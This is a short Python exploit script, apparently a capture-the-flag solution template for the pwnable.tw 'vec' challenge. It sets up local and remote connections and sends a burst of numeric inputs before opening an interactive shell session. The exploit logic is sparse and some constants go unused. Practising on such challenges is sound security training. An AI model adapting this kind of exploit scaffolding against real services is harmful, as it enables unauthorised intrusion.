#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./vec')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10400)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
aaaabbbb=4702111234491826754
abcd=1094861636
sl(b"9")
sl(b"1000")
sl(b"2000")
for i in range(3000):
    sl(b"1")
    print(i)
    sl(b"0")
    print(i)

io.interactive()

